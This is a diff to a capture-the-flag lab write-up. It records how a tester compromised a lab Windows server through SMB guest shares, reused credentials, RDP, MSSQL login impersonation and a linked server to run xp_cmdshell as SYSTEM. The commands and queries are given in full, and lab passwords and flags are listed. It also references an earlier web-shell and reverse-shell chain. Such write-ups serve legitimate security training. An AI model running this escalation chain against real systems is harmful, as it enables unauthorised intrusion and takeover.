@@ -23,9 +23,11 @@
 ### Server 3 — Internal File/Material Management + Unknown Database
 - **Role:** Internal server used to manage files and working material (forms); database present (purpose unknown)
 - **IP:** 10.129.203.10
-- **OS:** *(TBD — pending recon)*
+- **OS:** Windows Server 2019 Build 17763 (XAMPP stack)
+- **Hostname:** WIN-HARD
+- **Domain:** WIN-HARD (standalone, not domain joined)
 - **Difficulty:** Easy
-- **Status:** ⏳ Pending
+- **Status:** ✅ COMPROMISED
 
 ## Recon
 
@@ -150,17 +152,84 @@ cat flag.txt
 ```
 **Flag:** `HTB{1qay2wsx3EDC4rfv_M3D1UM}`
 
-### Server 3
+### Server 3 — Complete Attack Chain
+
+**Phase 1: SMB Guest Access & Credential Discovery**
 ```bash
-# commands, payloads
+smbclient -L //10.129.203.10/ -N
+smbclient //10.129.203.10/Home -U guest
+# Downloaded from IT share:
+#   IT/Fiona/creds.txt      → 5 passwords
+#   IT/John/information.txt → hints: "Keep testing with the database", "Create a local linked server", "Simulate Impersonation"
+#   IT/John/secrets.txt     → 5 passwords
+#   IT/Simon/random.txt     → 5 passwords
 ```
+
+**Phase 2: SMB Authentication Confirmed**
+```bash
+crackmapexec smb 10.129.203.10 -u fiona -p '48Ns72!bns74@S84NNNSl'
+crackmapexec smb 10.129.203.10 -u john -p 'SecurePassword!'
+```
+**Result:** Both fiona and john have valid SMB credentials
+
+**Phase 3: RDP Access (Hydra Hint → xfreerdp3)**
+```bash
+# Hydra RDP module (experimental) hinted at valid passwords:
+# "might be valid but account not active for remote desktop"
+# This means password is correct but user not in "Remote Desktop Users"
+# Fiona IS in BUILTIN\Remote Desktop Users — xfreerdp3 works:
+xfreerdp3 /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl' /cert:ignore
+```
+
+**Phase 4: MSSQL Windows Integrated Auth**
+```bash
+impacket-mssqlclient 'WIN-HARD/fiona:48Ns72!bns74@S84NNNSl@10.129.203.10' -windows-auth
+```
+**Enumeration:**
+```sql
+SELECT SYSTEM_USER;                    -- WIN-HARD\Fiona
+SELECT IS_SRVROLEMEMBER('sysadmin');   -- 0 (not sysadmin)
+SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
+-- Found: IMPERSONATE on john (principal_id 272) and simon (principal_id 273)
+SELECT srvname, isremote FROM sysservers;
+-- Found: WINSRV02\SQLEXPRESS (remote=1), LOCAL.TEST.LINKED.SRV (remote=0)
+```
+
+**Phase 5: Linked Server Escalation (The Key Pivot)**
+```sql
+-- Impersonate john and query linked server
+EXECUTE AS LOGIN = 'john';
+SELECT * FROM OPENQUERY([LOCAL.TEST.LINKED.SRV], 'SELECT SYSTEM_USER');
+-- Result: testadmin
+SELECT * FROM OPENQUERY([LOCAL.TEST.LINKED.SRV], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
+-- Result: 1 (SYSADMIN!)
+```
+
+**Phase 6: use_link Bracket Trick & xp_cmdshell**
+```sql
+-- use_link with dots in name requires brackets!
+use_link [LOCAL.TEST.LINKED.SRV]
+-- Prompt changes to: SQL >[LOCAL.TEST.LINKED.SRV] (testadmin dbo@master)>
+enable_xp_cmdshell
+xp_cmdshell whoami
+-- Result: nt authority\system
+xp_cmdshell "type C:\Users\Administrator\Desktop\flag.txt"
+-- Result: HTB{46u$!n9_l!nk3d_$3r3r$}
+```
+
+**Phase 7: Flag Capture**
+```powershell
+# Located in Administrator's Desktop
+type C:\Users\Administrator\Desktop\flag.txt
+```
+**Flag:** `HTB{46u$!n9_l!nk3d_$3r3r$}`
 
 ## Flags
 | Server | Host | Flag | Status |
 |--------|------|------|--------|
 | 1 | Email/Files | `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}` | ✅ **CAPTURED** |
 | 2 | Internal Email/File | `HTB{1qay2wsx3EDC4rfv_M3D1UM}` | ✅ **CAPTURED** |
-| 3 | File/Material + DB | HTB{...} | ⏳ Pending |
+| 3 | File/Material + DB | `HTB{46u$!n9_l!nk3d_$3r3r$}` | ✅ **CAPTURED** |
 
 ## Credentials Discovered
 
@@ -168,6 +237,11 @@ cat flag.txt
 |---------|----------|--------|----------|
 | `fiona@inlanefreight.htb` | `987654321` | Hydra (SMTP AUTH) | SMTP, FTP, HTTP Basic Auth, MySQL |
 | `simon` | `8Ns8j1b!23hs4921smHzwn` | mynotes.txt (FTP) | SSH |
+| `WIN-HARD\fiona` | `48Ns72!bns74@S84NNNSl` | creds.txt (SMB) | SMB, RDP, MSSQL (Win Auth) |
+| `WIN-HARD\john` | `SecurePassword!` | secrets.txt (SMB) | SMB |
+| `john` (SQL_LOGIN) | *(password unknown — used via IMPERSONATE)* | MSSQL permissions | MSSQL impersonation |
+| `simon` (SQL_LOGIN) | *(password unknown — used via IMPERSONATE)* | MSSQL permissions | MSSQL impersonation |
+| `testadmin` (linked server) | *(mapped from john impersonation)* | Linked server | LOCAL.TEST.LINKED.SRV (sysadmin) |
 
 ## Attack Chain Summary (Server 2)
 
@@ -187,20 +261,30 @@ SSH login as simon → flag.txt in home directory
 Flag captured: HTB{1qay2wsx3EDC4rfv_M3D1UM}
 ```
 
+## Attack Chain Summary (Server 3)
+
 ```
-SMTP RCPT enum → fiona@inlanefreight.htb discovered
+SMB guest access → download creds.txt, secrets.txt, random.txt
     ↓
-Hydra brute force SMTP AUTH → password: 987654321
+Password list extracted from SMB files
     ↓
-MySQL login with fiona creds → secure_file_priv = '' (empty)
+Hydra RDP brute force (unreliable module) hinted valid passwords
     ↓
-SELECT INTO OUTFILE → PHP web shell in C:\xampp\htdocs\shell.php
+xfreerdp3 confirmed fiona RDP access: 48Ns72!bns74@S84NNNSl
     ↓
-Web shell RCE as NT AUTHORITY\SYSTEM
+MSSQL Windows Integrated Auth as fiona
     ↓
-PowerShell reverse shell → interactive access
+IMPERSONATE privilege on john (SQL_LOGIN 272) and simon (SQL_LOGIN 273)
     ↓
-Flag captured from C:\Users\Administrator\Desktop\flag.txt
+EXECUTE AS LOGIN = 'john' → query LOCAL.TEST.LINKED.SRV
+    ↓
+Linked server connects as testadmin (SYSADMIN!)
+    ↓
+use_link [LOCAL.TEST.LINKED.SRV] ← BRACKETS REQUIRED for dotted names
+    ↓
+enable_xp_cmdshell → xp_cmdshell whoami = nt authority\system
+    ↓
+Flag captured: HTB{46u$!n9_l!nk3d_$3r3r$}
 ```
 
 ## Lessons Learned
@@ -223,18 +307,34 @@ Flag captured from C:\Users\Administrator\Desktop\flag.txt
 - **POP3 catch-all configuration** (accepting any USER) prevents user enumeration — pivot to other services
 - **DNS zone transfers** reveal network topology but don't directly lead to compromise — combine with other vectors
 
+### Server 3
+- **SMB guest access** can reveal credential files even when anonymous/null is denied
+- **Files named `information.txt`** often contain direct hints from lab designers — read them carefully
+- **Hydra RDP module is experimental/unreliable** — "might be valid but account not active for remote desktop" actually means **password is correct**
+- **MSSQL IMPERSONATE privilege** is a powerful escalation path — always check `sys.server_permissions`
+- **Linked servers** can bypass local privilege restrictions — `LOCAL.TEST.LINKED.SRV` mapped john to testadmin (sysadmin)
+- **`use_link` with dotted names requires brackets** — `use_link [LOCAL.TEST.LINKED.SRV]` works, `use_link LOCAL.TEST.LINKED.SRV` fails
+- **xp_cmdshell on linked server** runs as the linked server service account — often `nt authority\system`
+- **Never trust filenames with "OLD"** — this pattern held true from Password Attacks assessment too
+- **RDP group membership** (`BUILTIN\Remote Desktop Users`) is separate from password validity — check both
+
 ### Tools Used
 - `smtp-user-enum` — SMTP user enumeration
-- `hydra` — SMTP AUTH brute force, SSH brute force
+- `hydra` — SMTP AUTH brute force, SSH brute force, RDP brute force (hint only)
 - `mysql` client — MySQL access with `--skip-ssl`
 - `curl` — web shell interaction
 - `nc` — reverse shell listener
 - `ftp` — anonymous FTP access
 - `nmap` — full port scanning
 - `dig` — DNS zone transfer
+- `smbclient` / `crackmapexec smb` — SMB enumeration and auth testing
+- `impacket-mssqlclient` — MSSQL Windows Integrated Auth, linked server exploitation
+- `xfreerdp3` — RDP connection
 
 ---
 
-*Updated: 2026-04-22 20:45 UTC+8*
+*Updated: 2026-04-22 23:23 UTC+8*
 *Server 1 Status: ✅ COMPROMISED*
 *Server 2 Status: ✅ COMPROMISED*
+*Server 3 Status: ✅ COMPROMISED*
+*Assessment Status: 🏆 COMPLETE — All 3 flags captured*
